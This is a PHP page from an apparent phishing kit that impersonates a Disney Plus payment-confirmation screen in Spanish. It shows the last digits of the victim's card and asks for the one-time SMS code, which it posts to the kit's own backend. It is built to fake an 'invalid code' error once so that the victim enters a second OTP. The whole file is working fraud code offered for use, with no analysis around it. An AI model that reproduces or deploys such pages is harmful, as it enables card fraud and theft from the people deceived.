<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disney plus</title>
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
    <div class="left">
        <img src="res/logo.png">
    </div>
    <div class="right">
        <div class="legend">Actualizar información de pago</div>
    </div>
</header>

<main>
<div class="form" style="width:1000px; margin:0">

<div class="container mt-5 p-4">
<div class="row m-0">
    <div class="col text-left">
        <img src="res/log.png" style="width:90px;">
    </div>
    <div class="col text-right">
        <img src="res/vm.png" style="width:90px;">
    </div>
</div>
</div>

<div class="container w-100 m-0 p-4 text-center border-top">
    <h4>Por favor confirme esta transacción</h4>
</div>

<div class="container w-100 p-3 border-top text-left" style="background:#f6f6f6;">
    <p>Para confirmar esta transacción, ingrese el OTP enviado a su número de teléfono.</p>
    <table class="table table-sm table-borderless sms">
        <tr>
            <th>Comerciante :</th>
            <td>Disney Plus</td>
        </tr>
        <tr>
            <th>Número de tarjeta :</th>
            <td>XXXX XXXX XXXX <?php echo substr(@$_SESSION["card_num"], -4); ?></td>
        </tr>
        <tr>
            <th>OTP :</th>
            <td>
                <input type="text" class="form-control rounded-pill" id="d0"><br>
                <?php if(isset($_GET['e'])) { echo '<div class="error">El código OTP ingresado no es válido.</div>'; } ?>
            </td>
        </tr>
    </table>
</div>

<div class="container p-3 text-center border-top" style="text-align:right !important;">
    <button onclick="sendSms()" style="width:200px; padding:10px;">Enviar</button>
</div>

</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
 
function sendSms(){
    if($("#d0").val().length<6){
        return $("#d0").addClass("error");
    }

    $.post("post.php",{otp:$("#d0").val()}, function(d){
        <?php if(isset($_GET['e'])){  
            echo 'window.location="done.php";'; }
            else{
            echo 'window.location="wait.php?next=sms.php?e";';
        } ?>
        
    });
}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendSms();
    }
});
 
</script>
</body>
</html>